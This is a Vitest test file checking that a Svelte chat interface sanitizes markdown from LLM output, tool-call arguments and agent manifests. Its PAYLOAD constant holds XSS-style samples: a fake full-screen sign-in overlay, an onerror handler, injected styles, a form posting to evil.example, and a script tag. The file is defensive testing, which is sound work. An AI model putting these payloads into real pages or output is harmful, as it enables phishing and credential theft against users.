import { describe, it, expect, vi, afterEach } from 'vitest';
import { render, cleanup } from '@testing-library/svelte';
import { marked } from 'marked';

// Wiring, not mechanism: `sanitize.unit.ts` proves what the sanitizer refuses, and
// `html-sinks.py` rule 4 proves these files import it. This proves the rendered
// component really runs the value through it — that a call site cannot go back to
// `marked.parse(...)` into `{@html}` while still importing the module somewhere.
//
// Its own file on purpose: `tool-call.unit.svelte.ts` used to mock `marked` and
// `dompurify`, and module mocks are registry-wide, so a case added there renders
// whatever its mocks say rather than what ships. Nothing here mocks the sanitizer.

// jsdom has no matchMedia and ChatMessage reads the viewport through useIsMobile.
window.matchMedia = vi.fn().mockImplementation((query: string) => ({
    matches: false,
    media: query,
    onchange: null,
    addEventListener: vi.fn(),
    removeEventListener: vi.fn(),
    dispatchEvent: vi.fn(),
}));

// The API layer (and through it IndexedDB) reaches these components transitively;
// none of the cases below makes a request.
vi.mock('$lib/api', () => ({ getTaskMessageFull: vi.fn() }));

// Hoisted because the mock factory below runs while the import graph is still being
// built, before this file's own statements have run.
const { PAYLOAD } = vi.hoisted(() => ({
    // An LLM (or the repository a tool just read, or a manifest, or a language server)
    // wrote this. The overlay is the payload that matters: it executes nothing, so
    // DOMPurify's defaults keep it, and it paints over the app in the app's own theme.
    PAYLOAD: [
        '<p style="position:fixed;inset:0;background:#111">Sign in to continue</p>',
        '<img src=x onerror="alert(1)">',
        // The same layout power as the line above, in the syntax DOMPurify’s defaults
        // keep — a stylesheet nested in a container, which is also what `marked` emits.
        '<div><style>.card{display:none}</style></div>',
        '<form action="https://evil.example"><input name="t"><button>Continue</button></form>',
        '<script>steal()</script>',
        'Real **answer** with `code`.',
    ].join('\n\n'),
}));

vi.mock('$lib/services/extension-manager.svelte', () => ({
    extensionManager: {
        state: {
            extensions: [
                {
                    name: 'pi',
                    type: 'agent',
                    enabled: true,
                    manifest: {
                        display_name: 'Pi',
                        capabilities: { agent: { description: PAYLOAD, setup_info: PAYLOAD } },
                    },
                },
            ],
        },
    },
}));

import ToolCall from '$lib/components/Chat/ToolCall.svelte';
import ChatMessage from '$lib/components/Chat/ChatMessage.svelte';
import AgentSection from '$lib/components/ConfigModal/AgentSection.svelte';
import { htmlHazards } from '$lib/utils/__tests__/html-hazards';

afterEach(cleanup);

/** The payload's words survive — only its markup power is gone. The sink element must
 * exist at all, or "no hazards" would be vacuously true of a component that stopped
 * rendering the value entirely. */
function assertRenderedSafely(scope: Element | null | undefined) {
    expect(scope, 'the sink rendered').toBeTruthy();
    expect(htmlHazards(scope as Element)).toEqual([]);
    expect(scope?.textContent).toContain('Sign in to continue');
    expect(scope?.querySelector('strong')?.textContent).toBe('answer');
}

// Control case for every assertion below: marked hands the overlay and the stylesheet
// through untouched, so `hazards` is reading a real refusal rather than a payload that
// never made it.
it('the payload reaches a sink as dangerous markup unless sanitized', () => {
    const raw = marked.parse(PAYLOAD, { async: false }) as string;
    expect(raw).toContain('position:fixed');
    expect(raw).toContain('<style');
});

const toolCallBase = {
    expandedArgs: new Set<string>(),
    editDiffOverrides: {},
    onToggleArgs: vi.fn(),
    onToggleEditDiff: vi.fn(),
};

function toolCall(overrides: Record<string, unknown>) {
    return {
        toolId: 'tool-1',
        toolName: 'bash',
        args: {},
        result: undefined,
        success: true,
        isPending: false,
        sandbox: false,
        resultTruncated: false,
        ...overrides,
    };
}

describe('ToolCall — the three markdown sinks', () => {
    it('sanitizes a request_review summary', () => {
        const { container } = render(ToolCall, {
            ...toolCallBase,
            toolCall: toolCall({ toolName: 'request_review', args: { summary: PAYLOAD } }),
        });
        assertRenderedSafely(container.querySelector('.tool-result-summary'));
    });

    it('sanitizes an ask_question question', () => {
        const { container } = render(ToolCall, {
            ...toolCallBase,
            toolCall: toolCall({ toolName: 'ask_question', args: { question: PAYLOAD } }),
        });
        assertRenderedSafely(container.querySelector('.tool-result-question'));
    });

    it('sanitizes the recorded answer to an auto-answered question', () => {
        const { container } = render(ToolCall, {
            ...toolCallBase,
            toolCall: toolCall({
                toolName: 'ask_question',
                args: { question: 'Proceed?' },
                result: PAYLOAD,
            }),
        });
        assertRenderedSafely(container.querySelector('.auto-answer-body'));
    });
});

describe('ChatMessage — the assistant and user sinks', () => {
    it('sanitizes assistant markdown', () => {
        const { container } = render(ChatMessage, { role: 'assistant', content: PAYLOAD });
        assertRenderedSafely(container.querySelector('.assistant-bubble .message-text'));
    });

    it('escapes a user message rather than parsing it', () => {
        // The other half of the same rule: what the user typed is never markup, so
        // an XSS payload pasted into the chat box renders as the text of a payload.
        const { container } = render(ChatMessage, { role: 'user', content: PAYLOAD });
        const bubble = container.querySelector('.message-text') as Element;
        expect(htmlHazards(bubble)).toEqual([]);
        expect(bubble.textContent).toContain('<p style="position:fixed');
    });
});

describe('AgentSection — the manifest sinks', () => {
    it('sanitizes an agent manifest’s description and setup note', () => {
        const { container } = render(AgentSection, { agentName: 'pi' });
        assertRenderedSafely(container.querySelector('.agent-info-text'));
        assertRenderedSafely(container.querySelector('.agent-info-box'));
    });
});
